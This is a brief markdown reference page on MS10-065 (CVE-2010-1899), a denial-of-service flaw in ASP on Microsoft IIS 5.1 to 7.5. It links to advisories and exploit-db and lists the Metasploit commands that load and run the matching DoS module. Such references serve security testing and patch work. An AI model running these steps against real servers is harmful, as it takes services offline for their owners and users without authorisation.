# MS10-065
```
Stack consumption vulnerability in the ASP implementation in Microsoft Internet Information Services 
(IIS) 5.1, 6.0, 7.0, and 7.5 allows remote attackers to cause a denial of service (daemon outage) via a crafted request, 
related to asp.dll, aka "IIS Repeated Parameter Request Denial of Service Vulnerability."
```

Vulnerability reference:
 * [MS10-065](https://technet.microsoft.com/library/security/ms10-065)  
 * [CVE-2010-1899](http://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2010-1899)  
 * [exp-db](https://www.exploit-db.com/exploits/15167/)  



## load the module within the Metasploit
[msf](https://www.rapid7.com/db/modules/AUXILIARY/DOS/WINDOWS/HTTP/MS10_065_II6_ASP_DOS)
```
msf > use auxiliary/dos/windows/http/ms10_065_ii6_asp_dos
msf auxiliary(ms10_065_ii6_asp_dos) > show actions
    ...actions...
msf auxiliary(ms10_065_ii6_asp_dos) > set ACTION <action-name>
msf auxiliary(ms10_065_ii6_asp_dos) > show options
    ...show and set options...
msf auxiliary(ms10_065_ii6_asp_dos) > run
```